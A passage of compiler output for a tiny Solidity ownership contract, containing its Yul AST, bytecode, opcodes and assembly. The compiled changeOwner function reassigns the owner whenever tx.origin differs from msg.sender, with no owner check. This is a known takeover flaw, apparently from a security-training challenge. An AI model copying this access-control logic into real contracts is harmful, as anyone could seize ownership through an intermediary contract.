																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1253:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1253:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1253:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "1154:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1366:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1383:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1386:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1376:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1376:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1376:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "1277:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1443:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1500:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1509:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1512:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1502:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1502:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1502:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1466:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1491:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "1473:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1473:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1463:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1463:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1456:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1456:43:1"
															},
															"nodeType": "YulIf",
															"src": "1453:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1436:5:1",
														"type": ""
													}
												],
												"src": "1400:122:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a6f9dae114610059575b600080fd5b610043610075565b6040516100509190610161565b60405180910390f35b610073600480360381019061006e9190610125565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff161461010d57806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008135905061011f816101b3565b92915050565b60006020828403121561013b5761013a6101ae565b5b600061014984828501610110565b91505092915050565b61015b8161017c565b82525050565b60006020820190506101766000830184610152565b92915050565b60006101878261018e565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6101bc8161017c565b81146101c757600080fd5b5056fea2646970667358221220af07c32029845ff0c32b55f9473f547ea42b9cbd91e31cb5218f3504c1459e6964736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x75 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x161 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x125 JUMP JUMPDEST PUSH2 0x99 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x10D JUMPI DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x11F DUP2 PUSH2 0x1B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x13B JUMPI PUSH2 0x13A PUSH2 0x1AE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x149 DUP5 DUP3 DUP6 ADD PUSH2 0x110 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x15B DUP2 PUSH2 0x17C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x176 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x152 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x187 DUP3 PUSH2 0x18E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x17C JUMP JUMPDEST DUP2 EQ PUSH2 0x1C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAF SMOD 0xC3 KECCAK256 0x29 DUP5 0x5F CREATE 0xC3 0x2B SSTORE 0xF9 SELFBALANCE EXTCODEHASH SLOAD PUSH31 0xA42B9CBD91E31CB5218F3504C1459E6964736F6C6343000807003300000000 ",
							"sourceMap": "60:230:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;86:20;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;171:116;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;86:20;;;;;;;;;;;;:::o;171:116::-;239:10;226:23;;:9;:23;;;222:60;;268:6;260:5;;:14;;;;;;;;;;;;;;;;;;222:60;171:116;:::o;7:139:1:-;53:5;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;7:139;;;;:::o;152:329::-;211:6;260:2;248:9;239:7;235:23;231:32;228:119;;;266:79;;:::i;:::-;228:119;386:1;411:53;456:7;447:6;436:9;432:22;411:53;:::i;:::-;401:63;;357:117;152:329;;;;:::o;487:118::-;574:24;592:5;574:24;:::i;:::-;569:3;562:37;487:118;;:::o;611:222::-;704:4;742:2;731:9;727:18;719:26;;755:71;823:1;812:9;808:17;799:6;755:71;:::i;:::-;611:222;;;;:::o;920:96::-;957:7;986:24;1004:5;986:24;:::i;:::-;975:35;;920:96;;;:::o;1022:126::-;1059:7;1099:42;1092:5;1088:54;1077:65;;1022:126;;;:::o;1277:117::-;1386:1;1383;1376:12;1400:122;1473:24;1491:5;1473:24;:::i;:::-;1466:5;1463:35;1453:63;;1512:1;1509;1502:12;1453:63;1400:122;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "102400",
								"executionCost": "24413",
								"totalCost": "126813"
							},
							"external": {
								"changeOwner(address)": "24755",
								"owner()": "2489"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 113,
									"end": 165,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 113,
									"end": 165,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 113,
									"end": 165,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 113,
									"end": 165,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 149,
									"end": 159,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 141,
									"end": 146,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 141,
									"end": 146,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 141,
									"end": 159,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 141,
									"end": 159,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 141,
									"end": 159,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 141,
									"end": 159,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 290,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220af07c32029845ff0c32b55f9473f547ea42b9cbd91e31cb5218f3504c1459e6964736f6c63430008070033",
									".code": [
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "A6F9DAE1"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 290,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 290,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 86,
											"end": 106,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 86,
											"end": 106,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 239,
											"end": 249,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 226,
											"end": 249,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 226,
											"end": 249,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 226,
											"end": 235,
											"name": "ORIGIN",
											"source": 0
										},
										{
											"begin": 226,
											"end": 249,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 226,
											"end": 249,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 226,
											"end": 249,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 222,
											"end": 282,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 222,
											"end": 282,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 268,
											"end": 274,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 265,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 260,
											"end": 265,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 260,
											"end": 274,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 260,
											"end": 274,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 260,
											"end": 274,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 260,
											"end": 274,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 222,
											"end": 282,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 222,
											"end": 282,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 171,
											"end": 287,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 146,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 7,
											"end": 146,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 53,
											"end": 58,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 97,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 78,
											"end": 98,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 69,
											"end": 98,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 69,
											"end": 98,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 107,
											"end": 140,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 134,
											"end": 139,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 107,
											"end": 140,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 7,
											"end": 146,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 146,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 146,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 146,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 146,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 152,
											"end": 481,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 152,
											"end": 481,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 211,
											"end": 217,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 260,
											"end": 262,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 248,
											"end": 257,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 239,
											"end": 246,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 235,
											"end": 258,
											"name": "SUB",
											"source": 1
										},
										{
